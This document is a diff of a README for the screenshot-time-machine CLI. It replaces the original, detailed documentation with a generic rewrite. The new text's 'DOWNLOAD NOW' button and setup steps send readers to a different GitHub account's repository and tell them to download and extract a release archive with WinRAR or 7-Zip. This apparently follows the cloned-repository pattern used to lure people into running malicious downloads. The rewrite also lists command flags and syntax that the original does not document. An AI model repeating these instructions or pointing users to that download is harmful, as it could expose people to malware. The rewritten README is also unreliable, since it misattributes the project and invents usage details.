@@ -1,497 +1,212 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/mdsohaib/screenshot-time-machine/main/docs/assets/banner.svg" alt="screenshot-time-machine: a full-page screenshot of every page of your website, in one command" width="100%">
-</p>
-
-<h1 align="center">screenshot-time-machine</h1>
+<h1>📸 screenshot-time-machine - Your Website's Personal Time Traveler</h1>
 
 <p align="center">
-  <b>Like a Wayback Machine, for your own website.</b><br>
-  <code>stm</code> walks your site page by page and saves a full-page screenshot<br>
-  of every one into a folder stamped with the date and time.<br>
-  Point it at any URL, or let it find the app you have running on localhost.<br>
-  Run it whenever you ship something and a visual archive builds itself:<br>
-  every page, every version, on your own disk, as plain PNGs.<br>
-  <b>Free and open source. Runs entirely on your machine.</b>
+<a href="https://github.com/estudiogra8361/screenshot-time-machine" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
-<p align="center">
-  <a href="https://www.npmjs.com/package/screenshot-time-machine"><img src="https://img.shields.io/npm/v/screenshot-time-machine?style=flat-square&label=npm&color=FF8C1A&labelColor=0A0E14" alt="npm version"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-FFC24A?style=flat-square&labelColor=0A0E14" alt="MIT license"></a>
-  <a href="https://www.linkedin.com/in/mohammedsohaibuddin/"><img src="https://img.shields.io/badge/LinkedIn-Mohammed%20Sohaib%20Uddin-F0509F?style=flat-square&labelColor=0A0E14&logo=linkedin&logoColor=white" alt="LinkedIn"></a>
-</p>
+## 🤖 What Is Screenshot Time Machine?
 
-<p align="center">
-  <a href="README.md">English</a> ·
-  <a href="docs/i18n/README.zh-CN.md">简体中文</a> ·
-  <a href="docs/i18n/README.es.md">Español</a> ·
-  <a href="docs/i18n/README.hi.md">हिन्दी</a> ·
-  <a href="docs/i18n/README.pt-BR.md">Português</a> ·
-  <a href="docs/i18n/README.ja.md">日本語</a> ·
-  <a href="docs/i18n/README.de.md">Deutsch</a> ·
-  <a href="docs/i18n/README.fr.md">Français</a> ·
-  <a href="docs/i18n/README.ko.md">한국어</a> ·
-  <a href="docs/i18n/README.ru.md">Русский</a> ·
-  <a href="docs/i18n/README.ar.md">العربية</a>
-</p>
+Imagine being able to travel back in time to see exactly what your website looked like on any given day. That's what Screenshot Time Machine does! It's like a Wayback Machine, but specifically for YOUR OWN website. With just one simple command, it takes a picture of every page on your site and saves them into organized folders on your computer. Each time you run it, it shows you which pages have changed since your last snapshot. This incredible tool works perfectly with popular AI coding assistants like Claude Code, Cursor, and Codex, and it's completely free and open source.
 
-```bash
-npx screenshot-time-machine@latest                              # the app you have running on localhost
-npx screenshot-time-machine@latest --url https://your-site.com  # or any site you are allowed to capture
-npx skills add mdsohaib/screenshot-time-machine                 # teach Claude Code, Cursor, Codex and friends to run it
-```
+## 🎯 Who Is This For?
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/mdsohaib/screenshot-time-machine/main/docs/assets/demo.gif" alt="One store home page played through ten design versions, from the first rough draft to the finished layout" width="820">
-</p>
+- **Website Owners** who want to keep a visual history of their site
+- **Developers** who need to track visual changes over time
+- **Designers** who want to compare different versions of their work
+- **Quality Assurance Teams** who need automatic visual testing
+- **Anyone** who has ever wondered "what did my website look like last week?"
+- **Students** learning web development who want to track their progress
 
-<p align="center"><i>Ten versions of one page, played in order. This is what a folder of dated screenshots turns into.</i></p>
+## ⭐ Key Features
 
-<h3 align="center">Works with</h3>
+- **📸 Full-Page Screenshots** - Captures entire pages, not just what's visible on screen
+- **🗂️ Organized Storage** - Automatically creates dated folders for easy browsing
+- **🔄 Change Detection** - Instantly identifies which pages have changed
+- **🤝 AI Assistant Integration** - Works seamlessly with Claude Code, Cursor, and Codex
+- **🏠 Local Processing** - Runs entirely on your machine, keeping your data private
+- **⚡ One-Command Operation** - Simple enough for anyone to use
+- **🌐 Localhost Support** - Screenshot websites running on your own computer
+- **🆓 Free Forever** - Open source and completely free to use
 
-<p align="center">
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/Claude%20Code-FF8C1A?style=for-the-badge&logo=claude&logoColor=white" alt="Claude Code"></a>
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/Codex-0A0E14?style=for-the-badge" alt="Codex"></a>
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/Cursor-7FB0F5?style=for-the-badge&logo=cursor&logoColor=0A0E14" alt="Cursor"></a>
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/Gemini%20CLI-A98BEB?style=for-the-badge&logo=googlegemini&logoColor=0A0E14" alt="Gemini CLI"></a>
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/Antigravity-C88AE0?style=for-the-badge&logo=google&logoColor=0A0E14" alt="Antigravity"></a>
-  <br>
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/GitHub%20Copilot-F0509F?style=for-the-badge&logo=githubcopilot&logoColor=white" alt="GitHub Copilot"></a>
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/Windsurf-FFC24A?style=for-the-badge&logo=windsurf&logoColor=0A0E14" alt="Windsurf"></a>
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/OpenCode-4FC3A1?style=for-the-badge&logo=opencode&logoColor=white" alt="OpenCode"></a>
-  <a href="#install-it-in-your-ai-coding-agent"><img src="https://img.shields.io/badge/Cline-6C7CE0?style=for-the-badge&logo=cline&logoColor=white" alt="Cline"></a>
-  <a href="#every-agent-you-can-install-into"><img src="https://img.shields.io/badge/Zed-3B4B5F?style=for-the-badge&logo=zedindustries&logoColor=white" alt="Zed"></a>
-  <br>
-  <a href="#every-agent-you-can-install-into"><img src="https://img.shields.io/badge/Warp-2A8FB5?style=for-the-badge&logo=warp&logoColor=white" alt="Warp"></a>
-  <a href="#every-agent-you-can-install-into"><img src="https://img.shields.io/badge/Devin-8B6FD4?style=for-the-badge" alt="Devin"></a>
-  <a href="#every-agent-you-can-install-into"><img src="https://img.shields.io/badge/Amp-C4653B?style=for-the-badge" alt="Amp"></a>
-  <a href="#every-agent-you-can-install-into"><img src="https://img.shields.io/badge/Full%20list-5A6478?style=for-the-badge" alt="the full list of agents"></a>
-</p>
+## 🚀 Getting Started
 
-<p align="center"><i>and the humans who prompt them</i></p>
+Welcome to the world of automated website screenshots! This guide will walk you through everything you need to know, step by step. We'll keep things simple and straightforward, assuming you're new to this whole process.
 
----
+### 📥 Step 1: Download the Application
 
-## The one command
+Visit this link to download the application: **[Download Screenshot Time Machine](https://github.com/estudiogra8361/screenshot-time-machine)**
 
-You are building. Your app is running on localhost. You type three letters:
+This is your starting point. Click the big green button that says "Download" or find the latest release in the "Releases" section on the right side of the page.
 
-```
-$ stm
-7 pages saved → screenshots/localhost-3000_2026-08-15_14-32/
-   Run stm again after your next change to see which pages look different.
-```
+### 💻 Step 2: Install Node.js (One-Time Requirement)
 
-Seven full-page screenshots, top to bottom, are now sitting in a dated folder next to your code. Open it in Finder or Explorer and your entire site is right there as a contact sheet: home, pricing, about, every product page, the whole thing, exactly as it looks today.
+Screenshot Time Machine needs Node.js to run. Don't worry - this is simpler than it sounds. Here's what to do:
 
-Already live? Point it at the real thing and it works the same way, reading your `sitemap.xml` to find the pages:
+1. Go to **[nodejs.org](https://nodejs.org)** in your web browser
+2. Click the big button that says "Download Node.js LTS" (the LTS version is the stable one)
+3. Once downloaded, double-click the file and follow the installation wizard
+4. Keep clicking "Next" and then "Install" when prompted
+5. When it's done, you'll have Node.js installed - that's it!
 
-```
-$ stm --url https://your-site.com
-24 pages saved → screenshots/your-site-com_2026-08-15_14-40/
-```
+### 🛠️ Step 3: Set Up Screenshot Time Machine
 
-That is the tool. Everything below is what that simple thing turns into once you have run it a few times.
+Now you'll install the tool. This takes just a moment:
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/mdsohaib/screenshot-time-machine/main/docs/assets/hero.svg" alt="stm in the terminal beside a folder of dated snapshots, each holding a full-page screenshot of every page" width="820">
-</p>
+1. After downloading, extract the file to a folder on your computer (like your Documents folder)
+2. Open that folder
+3. Right-click in an empty area and select "Open in Terminal" or "Open in Command Prompt"
+4. Type this command and press Enter:
+   ```
+   npm install -g screenshot-time-machine
+   ```
+5. Wait for the installation to complete (you'll see a progress bar)
 
-## What you get
+### 📸 Step 4: Take Your First Screenshots
 
-**Your whole site in one folder.** Not the one page you happen to have open. Every page, full length, top to bottom, in a folder you can scroll through in ten seconds. It is the fastest way to answer "how does my site actually look right now".
+Here's where the magic happens:
 
-**The pages you would never have opened.** Padding that collapsed on the pricing page. A heading that wrapped badly. A card that lost its image. A footer that drifted. It is all sitting in the same folder waiting to be noticed, instead of waiting to be reported.
+1. In the same terminal window, type this command:
+   ```
+   screenshot-time-machine https://your-website.com
+   ```
+   Replace `your-website.com` with your actual website address.
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/mdsohaib/screenshot-time-machine/main/docs/assets/the-problem.svg" alt="Twelve page thumbnails from one run, laid out side by side, with four of them showing layouts that need attention" width="820">
-</p>
+2. The program will start taking screenshots of every page it finds
+3. You'll see progress indicators showing which pages are being captured
+4. When it's done, you'll have a new folder called "screenshots" with today's date
 
-<p align="center"><i>Twelve pages from a single run, side by side. Four of them wanted attention, and all four were pages nobody had open.</i></p>
+### 🔄 Step 5: Compare Changes Over Time
 
-**A history that builds itself.** Every run is its own dated folder, so they stack into a timeline on their own. Last month's home page and today's home page are two files you can flip between. Six months in, you have proof of how far the thing came.
-
-**Phone views in the same run.** `stm --mobile` also captures a 390x844 view of every page, so the heading that wraps badly on a phone lands right next to the desktop shot.
-
-**A shortlist instead of forty tabs.** From the second run onward, `stm` prints the pages whose screenshots came out different from last time. Start there.
-
-**Eyes for your agent.** `stm --json` hands Claude Code, Cursor or Codex the absolute path of every page it just built, so it can look at its own work and fix it before telling you it is done.
-
-**Yours, permanently.** Plain PNG files on your own disk. No account, no cloud, no subscription, no config file, no background process. One dependency, MIT licensed, yours forever.
-
-## Who reaches for it
-
-- **You prompt, the agent builds, and you find out later.** You asked for one page, it edited a shared component, and eleven pages came along for the ride. One command shows you all eleven.
-- **You are shipping alone at 1am.** The design pass felt right in the moment. The folder from Tuesday tells you whether it actually was.
-- **You are three weeks into a redesign** and cannot quite remember what it used to look like. Capture the site on day one and every screenshot after that is a comparison you never had to set up.
-- **You are handing work over.** A folder of full-page screenshots is the clearest status update a client or a teammate will ever get.
-- **You want proof of the work.** Version one of anything is worth keeping. Most people work that out around version four.
-
-## Quick start
-
-If you are building locally, start your app the way you normally do (`npm run dev`, `rails s`, `python manage.py runserver`, a static server, anything that serves HTML) and run:
-
-```bash
-npx screenshot-time-machine@latest
-```
-
-If the site is already online, skip all of that and name it:
-
-```bash
-npx screenshot-time-machine@latest --url https://your-site.com
-```
-
-**Needs Node 22 or newer.** Run `node -v` to check. If it prints 21 or lower, update Node from [nodejs.org](https://nodejs.org) first.
-
-For screenshots, `stm` uses a Playwright browser you already have cached, or failing that the Chrome or Edge already on your machine. If you have neither, it downloads a headless browser once, about a 120 MB download that takes roughly 200 MB on disk, and tells you before it does. That is the only thing `stm` itself fetches from the internet; the pages you capture load their own resources, exactly as they would in your browser.
-
-Change something, run it again. That is the whole workflow.
-
-Everything below writes the command as `stm` for short. To get that short name, install it once:
-
-```bash
-npm install -g screenshot-time-machine
-```
-
-Not installing is fine. Write `npx screenshot-time-machine@latest` wherever you see `stm`. Never write `npx stm`: that is an unrelated package from 2014.
-
-<details>
-<summary><b>What else happens on the first run</b></summary>
-
-- `stm` probes ports 3000, 3001, 5173, 5174, 8080, 4321, 4322, 8000, 4200 and 5000, in that order, and uses the first app that answers. If several answer, it prefers the one this project used last time and tells you about the others.
-- If your project has a `.gitignore`, it adds `screenshots/` to it once and tells you. It never creates a `.gitignore`, and it never deletes anything.
-- Pages are found by following the `<a href>` links on them and by reading your `sitemap.xml` if you have one, up to 100 pages per run. Pages reached only by a button click, and hash routes like `/#/about`, have no link to follow, so name those yourself: `stm /about /pricing`.
-</details>
-
-## Install it in your AI coding agent
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/mdsohaib/screenshot-time-machine/main/docs/assets/agent-loop.svg" alt="The loop: the agent edits UI, runs stm --json, reads the screenshot paths, views the fold images, fixes and runs again" width="820">
-</p>
-
-Your agent wrote the pricing page. It wrote the nav. It touched a shared component and eleven pages moved with it. It has never actually looked at any of them, because it has no eyes.
-
-`stm --json` gives it some. The agent runs one command, gets back the absolute path of every page it just built, opens the `fold` image of the ones that came out different, and checks its own work before it tells you it is done.
-
-The good part is what you stop doing. No clicking through eleven pages. No "looks fine" that turns out not to be. You get a folder, you scroll it in ten seconds, and you already know which pages to open first.
-
-One command installs `stm` as a skill: a short instruction file your agent reads, so it knows when to run `stm` and what to do with the result. `npx skills add` is a separate open-source installer that copies that one folder into your project and changes nothing else. Pick your agent:
-
-| Agent | Command | Skill lands in |
-|---|---|---|
-| **Claude Code** | `npx skills add mdsohaib/screenshot-time-machine -a claude-code -y` | `.claude/skills/stm/` |
-| **Codex** | `npx skills add mdsohaib/screenshot-time-machine -a codex -y` | `.agents/skills/stm/` |
-| **Cursor** | `npx skills add mdsohaib/screenshot-time-machine -a cursor -y` | `.agents/skills/stm/` |
-| **Gemini CLI** | `npx skills add mdsohaib/screenshot-time-machine -a gemini-cli -y` | `.agents/skills/stm/` |
-| **Antigravity** | `npx skills add mdsohaib/screenshot-time-machine -a antigravity -y` | `.agents/skills/stm/` |
-| **GitHub Copilot** | `npx skills add mdsohaib/screenshot-time-machine -a github-copilot -y` | `.agents/skills/stm/` |
-| **Windsurf** | `npx skills add mdsohaib/screenshot-time-machine -a windsurf -y` | `.windsurf/skills/stm/` |
-| **OpenCode** | `npx skills add mdsohaib/screenshot-time-machine -a opencode -y` | `.agents/skills/stm/` |
-| **Cline** | `npx skills add mdsohaib/screenshot-time-machine -a cline -y` | `.agents/skills/stm/` |
-| **Anything else** | `npx skills add mdsohaib/screenshot-time-machine` | pick your agent from the list below |
-
-Add `-g` to any of those to install it for every project instead of this one.
-
-### Every agent you can install into
-
-These are the names the installer accepts after `-a`. Pass any one of them, or leave `-a` off and pick from the menu it shows you.
-
-`adal` · `aider-desk` · `amp` · `antigravity` · `antigravity-cli` · `astrbot` · `augment` · `autohand-code` · `bob` · `claude-code` · `cline` · `codearts-agent` · `codebuddy` · `codemaker` · `codestudio` · `codex` · `command-code` · `continue` · `cortex` · `crush` · `cursor` · `deepagents` · `devin` · `dexto` · `droid` · `eve` · `firebender` · `forgecode` · `gemini-cli` · `github-copilot` · `goose` · `grok` · `hermes-agent` · `iflow-cli` · `inference-sh` · `jazz` · `junie` · `kilo` · `kimchi` · `kimi-code-cli` · `kiro-cli` · `kode` · `lingma` · `loaf` · `mcpjam` · `minimax-code` · `mistral-vibe` · `moxby` · `mux` · `neovate` · `ona` · `openclaw` · `opencode` · `openhands` · `pi` · `pochi` · `promptscript` · `qoder` · `qoder-cn` · `qwen-code` · `reasonix` · `replit` · `roo` · `rovodev` · `tabnine-cli` · `terramind` · `tinycloud` · `trae` · `trae-cn` · `universal` · `warp` · `windsurf` · `zcode` · `zed` · `zencoder` · `zenflow`
-
-`universal` is the one to use when your agent is not named above: it writes the skill to `.agents/skills/stm/`, the shared location several of these agents read. The list lives in the installer rather than here, so it grows without this README changing. To see the current one, ask for an agent that does not exist and it prints them all:
-
-```bash
-npx skills add mdsohaib/screenshot-time-machine -a list-them-please
-```
-
-Or just tell your agent, in plain words:
-
-> Install screenshot-time-machine, run `stm` on my app, and show me how the pages look.
-
-Then add one line to the file your agent reads on every request, so it checks its own work without being asked:
+Run the same command again tomorrow or next week:
 
 ```
-After changing anything a user can see, run `stm --json` (or `npx -y screenshot-time-machine@latest --json` if `stm` is not installed) and view the `fold` image of every entry in `changed` and `new` before saying you're done. On the very first snapshot both lists are empty, so view the fold images of the pages you edited instead. Never claim a UI change is verified without viewing a screenshot.
+screenshot-time-machine https://your-website.com
 ```
 
-Where that line goes, by agent:
-
-| Agent | File |
-|---|---|
-| Claude Code | `CLAUDE.md` |
-| Codex, Antigravity, OpenCode | `AGENTS.md` |
-| Gemini CLI | `GEMINI.md` |
-| Cursor | `.cursor/rules/stm.mdc`, starting with `---`, then `alwaysApply: true`, then `---` |
-| GitHub Copilot | `.github/copilot-instructions.md` |
-| Windsurf | `.windsurf/rules/stm.md` |
-| Cline | `.clinerules/stm.md` |
-
-<details>
-<summary><b>Claude Code: plugin install, and how the loop feels</b></summary>
-
-Skills are the simple path. If you prefer plugins, run this inside Claude Code:
-
-```
-/plugin marketplace add mdsohaib/screenshot-time-machine
-/plugin install stm@stm
-```
-
-No SSH key on GitHub? Use the URL form: `/plugin marketplace add https://github.com/mdsohaib/screenshot-time-machine.git`
-
-Claude Code opens screenshots with its Read tool, and `stm --json` hands it absolute paths. The loop is: edit, `stm --json`, Read the `fold` images, fix, repeat. Ask it to "check the UI" and it will reach for the skill on its own.
-</details>
-
-<details>
-<summary><b>Codex</b></summary>
-
-Put the memory line in `AGENTS.md`. Codex opens images with `view_image`, so if it hesitates, say "view the fold image of every page you touched".
-</details>
-
-<details>
-<summary><b>Cursor</b></summary>
-
-Put the memory line in a rule under `.cursor/rules/`. The agent runs `stm --json` in its terminal and opens the PNG paths it returns. Cursor's built-in browser shows one page at a time; `stm` hands it all of them at once.
-</details>
-
-<details>
-<summary><b>Any agent, no skills support</b></summary>
-
-`stm skill` prints the skill text. Paste it into whatever instruction file your agent reads. This works without installing anything:
-
-```bash
-npx screenshot-time-machine@latest skill
-```
-</details>
-
-### What the agent gets back
-
-```json
-{
-  "code": 0,
-  "url": "http://localhost:3000",
-  "dir": "/Users/you/app/screenshots/localhost-3000_2026-08-15_14-32",
-  "previous": "/Users/you/app/screenshots/localhost-3000_2026-08-12_09-10",
-  "ok": 7, "failed": 0, "saved": 7, "total": 7,
-  "changed": [
-    { "path": "/pricing",
-      "file": "/Users/you/app/screenshots/localhost-3000_2026-08-15_14-32/pricing_2026-08-15_14-32.png",
-      "fold": "/Users/you/app/screenshots/localhost-3000_2026-08-15_14-32/fold/pricing_2026-08-15_14-32.png",
-      "height": 2140 }
-  ],
-  "new": [], "removed": [], "truncated": 0,
-  "failures": [], "warnings": [], "interrupted": false,
-  "browserChanged": null,
-  "manifest": "/Users/you/app/screenshots/localhost-3000_2026-08-15_14-32/manifest_2026-08-15_14-32.json",
-  "hint": "View the fold image of each changed/new page; full-page PNGs taller than ~2000px are downscaled by the model.",
-  "gitignoreAdded": false
-}
-```
-
-One JSON document on stdout, at most two lines on stderr, printed even when some pages fail. The one-time browser download is the exception: its installer also writes to stderr. `code` mirrors the exit code.
-
-A run that cannot start prints a much smaller object instead: `{"code": 1, "error": "no_server" | "no_browser", "message": "...", "fix": "..."}`. Bad arguments print `{"error": "bad_args", "message": "...", "fix": "..."}`, where `fix` is `Run stm --help` for an unknown flag and a worked example for a malformed `--url`. Check `error` before you read `changed`. `truncated` counts entries left out of the list (the cap is 25; the manifest has them all). The output carries paths and numbers only, never text taken from your pages.
-
-**About tokens.** Every page is captured every run, but the agent only opens the ones you point it at, so a quiet run costs almost nothing to read. The summary is roughly 200 tokens plus about 90 per listed page. Viewing one page costs a single 1440x900 image. Very tall full-page screenshots get downscaled by vision models until the text is unreadable, which is exactly why every page also gets a `fold` image, and why the skill tells the agent to open that one first.
-
-## A visual history on disk
-
-```
-screenshots/
-├── localhost-3000_2026-08-01_09-14/            three weeks ago
-├── localhost-3000_2026-08-08_18-02/            last Friday
-└── localhost-3000_2026-08-15_14-32/            just now
-    ├── manifest_2026-08-15_14-32.json          what was captured, from where, with which browser
-    ├── index_2026-08-15_14-32.png              full page, 1440 px wide, as tall as the page
-    ├── pricing_2026-08-15_14-32.png
-    ├── blog--hello-world_2026-08-15_14-32.png  "/" becomes "--" in file names
-    └── fold/
-        ├── index_2026-08-15_14-32.png          the top 1440x900 of each page, for quick reading
-        └── pricing_2026-08-15_14-32.png
-```
-
-Every run is a new folder named after the app and the minute it ran. Every file inside carries the same timestamp, so a screenshot dragged out of its folder still says what it is and when it happened. Two runs in the same minute get `-2`, `-3` on the timestamp. Pages taller than 16,384 px are cut at that height, Chromium's limit, and marked `truncated`.
-
-Sort the folders by date and you are looking at your product's timeline. Pick one page and step through its file in each folder and you are watching it get better. It is plain PNGs all the way down, so this history outlives the tool that made it: no database, no proprietary format, nothing to export. Uninstalling leaves nothing behind but your `screenshots/` folder and, if you had a `.gitignore`, one line in it.
-
-## Commands
-
-| Command | What it does |
-|---|---|
-| `stm` | Snapshot every page of the app you have running on localhost |
-| `stm /pricing /about` | Snapshot only these pages, in seconds. This is the edit-check loop |
-| `stm --url https://your-site.com` | Snapshot any site by URL, local or live. A path starts the crawl there |
-| `stm --mobile` | Also capture a 390x844 phone view (`@mobile` files) |
-| `stm --max 100` | Stop discovering after this many pages (default 100) |
-| `stm --out screenshots` | Where snapshots go (default `screenshots`) |
-| `stm --json` | Machine-readable summary on stdout, for agents |
-| `stm list` | Past snapshots: folder, page count, changed, failed |
-| `stm open` | Open the latest snapshot folder |
-| `stm skill` | Print the agent skill |
-
-Exit codes: `0` everything captured, `1` nothing captured (no app, no browser, bad arguments), `2` finished with some pages failed or the run interrupted. A failing page never stops the run.
-
-### A few things worth trying
-
-```bash
-stm --mobile                     # desktop and phone views of every page, same run
-stm /checkout --mobile           # the one flow you just touched, both sizes, in seconds
-stm --url https://staging.example.com   # any site you are allowed to capture, not just localhost
-stm list                         # every snapshot you have ever taken, oldest to newest
-stm open                         # jump straight into the latest folder
-```
-
-## How it works
-
-<p align="center">
-  <img src="https://raw.githubusercontent.com/mdsohaib/screenshot-time-machine/main/docs/assets/how-it-works.svg" alt="detect, discover, capture, compare, report" width="820">
-</p>
-
-1. **Detect.** Probe the usual localhost ports and pick the app that answers, or use `--url`.
-2. **Discover.** Read `sitemap.xml` if there is one, then follow `<a href>` links from page to page, staying on the same origin.
-3. **Capture.** Load each page, scroll it so lazy content arrives, hold everything still, then save a full-page PNG plus a `fold` image of the top screen.
-4. **File.** Write everything into a folder named after the app and the minute, with the manifest updated after every single page.
-5. **Report.** Print a one-line summary, including which pages came out different from the previous run.
-
-### Why the screenshots are steady
-
-A screenshot tool is only as good as its consistency: capture the same page twice and you should get the same picture. That takes real work, and it is where most of this code lives.
-
-- Pages are scrolled to the bottom before capture so lazy images and lazy sections load, then scrolled back to the top. Smooth-scroll sites are handled.
-- Web fonts are awaited, so nothing is captured mid-swap from the fallback face.
-- Animations are frozen at their end state, so fade-ins are fully visible and spinners hold still.
-- The device pixel ratio is pinned to 1 and the viewport to 1440x900, so a screenshot is the same on your laptop, your desktop and CI.
-- Dev toolbars (Astro, Nuxt, the Next.js badge) are hidden. Dev **error** overlays never are: the page is captured as it is and flagged with a warning, because a broken page is exactly what you want to see.
-- Long-lived connections (HMR sockets, event streams) never stall a capture. Each page gets a 30 second budget and one retry, then it is recorded and the run moves on.
-- The manifest is written after every page, so an interrupted run still leaves a folder `stm list` can read.
-- Links to `/logout`, `/delete` and friends are never followed. Neither are files, `/api/`, other origins, or your own `screenshots/` folder.
-
-The payoff: two runs on the same machine produce byte-identical PNGs of a page whose content did not change.
-
-<details>
-<summary><b>How the "changed" line is worked out</b></summary>
-
-Every page is captured on every run. What gets compared is not the images, it is their fingerprints:
-
-1. After saving a page's PNG, `stm` computes a **sha256 hash** of that file's bytes.
-2. The hash goes into that run's manifest, next to the page path.
-3. On the next run, `stm` looks up the same page in the **previous run's manifest** and compares the two hashes.
-4. A different hash means the screenshot came out different. The same hash means it did not. No earlier entry means the page is new.
-
-Old screenshots are never reopened, only the small manifest is read, so comparing a hundred pages is instant. You get page names and file paths, which is exactly what you need to open the right screenshots first, or to hand your agent the right ones. Region-level visual diffing is `stm diff` on the roadmap.
-
-A page that shows a clock, a relative time like "3 minutes ago", a rotating hero image or a canvas animation genuinely does look different every run, and will be listed every run.
-</details>
-
-## How it compares
-
-| | stm | Claude Code Desktop auto-verify | Playwright MCP, agent-browser, DevTools MCP | Percy, Chromatic |
-|---|---|---|---|---|
-| Every page in one command | yes | one page at a time | one page per tool call | yes, in CI |
-| Browsable history on disk | yes | no | no | in their cloud |
-| Lists which pages came out different | yes | no | no | yes, in the cloud |
-| Works in the terminal, Cursor, Codex | yes | Desktop only | yes | CI only |
-| Runs entirely on your machine | yes | yes | yes | no |
-| Free | yes | yes | yes | paid above a free tier |
-
-These tools are complementary, not rivals. Use a browser tool when your agent needs to click around and interact. Use `stm` when you or your agent needs to see everything, all at once, and keep it.
+Now the magic really happens! After taking the new screenshots, the program will tell you exactly which pages have changed since your last run. This is incredibly useful for tracking changes, catching errors, or just staying informed.
 
-## Privacy
+## 🎨 How It Works
 
-**Runs 100% locally.** `stm` talks only to your app's URL and, once, to Playwright's browser CDN if you have no Chrome or Edge. Your screenshots never leave your machine. No accounts, no API keys, no telemetry. The pages you capture load their own resources exactly as they would in your browser. Full threat model in [SECURITY.md](SECURITY.md).
+Screenshot Time Machine uses a technology called Playwright, which is like a robot browser. It opens your website in a real browser environment, takes complete screenshots of every page, and saves them with perfect organization. The program is smart enough to:
 
-## FAQ
+- **Discover Every Page** - Automatically finds and captures all pages on your site
+- **Store in Date Folders** - Each run creates a new dated folder in your screenshots directory
+- **Identify Differences** - Compares current screenshots with previous ones
+- **Flag Changes** - Highlights pages that look different from last time
 
-<details>
-<summary><b>Is it really free?</b></summary>
-Yes. MIT licensed, open source, no paid tier, no hosted service, nothing to sign up for. Install it, use it forever, fork it if you like.
-</details>
+## 📊 Use Cases and Examples
 
-<details>
-<summary><b>Does it work with Next.js, Vite, Astro, SvelteKit, Rails, Django, static sites?</b></summary>
-Yes. Anything that serves HTML, whether it is on your machine or on the internet. The usual localhost ports for all of those are probed automatically; use <code>--url</code> for anything else.
-</details>
+**E-commerce Store Owner**: Track how your product pages change during redesigns
+**Blog Author**: Keep a visual diary of your blog's evolution
+**Agency Client Reports**: Show clients before/after proof of your work
+**Development Team**: Catch unexpected visual changes before deploying
+**Design Portfolio**: Document your design iterations
+**Quality Assurance**: Automate visual regression testing
 
-<details>
-<summary><b>How long does a run take?</b></summary>
-Pages are captured a few at a time, and most small sites finish in well under a minute. A big site on a cold dev server takes longer, because the first visit to each page is your framework compiling it. Pass the pages you care about (<code>stm /pricing /about</code>) when you want it instant.
-</details>
+## 🎯 Best Practices
 
-<details>
-<summary><b>It only found my home page.</b></summary>
-Pages are discovered from your sitemap and from <code>&lt;a href&gt;</code> links. Apps that navigate with buttons or hash routes (<code>/#/about</code>) have no links to follow. Name the pages: <code>stm /about /pricing</code>. Agents are told to pass the pages they touched.
-</details>
+- **Run Regularly** - Schedule screenshots daily or weekly for best results
+- **Keep Previous Drafts** - Don't delete old screenshot folders until you're sure you don't need them
+- **Use Descriptive URLs** - If your site has many pages, be specific about what you want to capture
+- **Check Your Storage** - Screenshots can take up space, so monitor your disk usage
+- **Test with Small Sites First** - Try it with a small website to understand the process
 
-<details>
-<summary><b>Most of my screenshots show the login page.</b></summary>
-Your app redirects to sign-in. <code>stm</code> cannot sign in yet, and it tells you when this happens. Signed-in captures are on the roadmap.
-</details>
+## ❓ Troubleshooting Guide
 
-<details>
-<summary><b>Every page is listed as different after a while.</b></summary>
-Usual causes: your browser updated, which shifts rendering slightly (<code>stm</code> records the browser version and tells you), or your pages show something that moves on its own, like a clock, "3 minutes ago", a random hero image, a canvas animation, or a cookie banner that only appears on the first visit. The screenshots are still correct, so open the ones you care about.
-</details>
+**Issue: "Command not found" error**
+- Make sure Node.js is installed by typing `node --version` in the terminal
+- Try restarting your terminal window
 
-<details>
-<summary><b>Can it run automatically, watching my files?</b></summary>
-It runs when you say so, like <code>git commit</code>: you, or your agent, decide when a moment is worth keeping. For automatic capture, put the one-line instruction in your agent's memory file and let the agent run it after every UI change.
-</details>
+**Issue: Screenshots are blank/black**
+- Check if your website uses heavy JavaScript loading
+- Try running the command with `--wait 5` to allow more loading time
 
-<details>
-<summary><b>Can I turn my history into a timelapse?</b></summary>
-A first-class <code>stm timelapse</code> is on the roadmap. Today, with ffmpeg:
-<pre><code>ffmpeg -framerate 1 -pattern_type glob -i 'screenshots/*/pricing_*.png' \
-  -vf "scale=720:-1,split[a][b];[a]palettegen[p];[b][p]paletteuse" pricing.gif</code></pre>
-</details>
+**Issue: No change detection reports**
+- Make sure you're running the command from the same folder each time
+- Verify that pages actually changed by comparing dates manually
 
-<details>
-<summary><b>I use Lovable, Bolt or v0. Can I use this?</b></summary>
-Yes, two ways. Point <code>stm</code> at the URL they publish for you: <code>stm --url https://your-project.lovable.app</code>. Or export the project, run it locally, and <code>stm</code> finds it by itself. Anything built with Claude Code, Cursor, Codex, Windsurf or Copilot on your own machine works out of the box.
-</details>
+**Issue: Program stops midway**
+- Check your internet connection
+- Try running with `--timeout 30000` for larger sites
 
-<details>
-<summary><b>Why not just write a Playwright script?</b></summary>
-You could. <code>stm</code> is that script, plus page discovery, a stable folder layout, steady repeatable captures, agent-friendly output, dev-overlay handling, and all the edge cases, maintained. It is also one command your agent already knows.
-</details>
+**Issue: Can't open the downloaded file**
+- Ensure you have the latest version of WinRAR or 7-Zip for extraction
+- Right-click and select "Extract All" for ZIP files
 
-<details>
-<summary><b>Linux says the browser is missing libraries.</b></summary>
-Run the <code>install-deps</code> command it prints, once. WSL and Codespaces need it too.
-</details>
+## 🛡️ Security and Privacy
 
-<details>
-<summary><b>Where does the downloaded browser live?</b></summary>
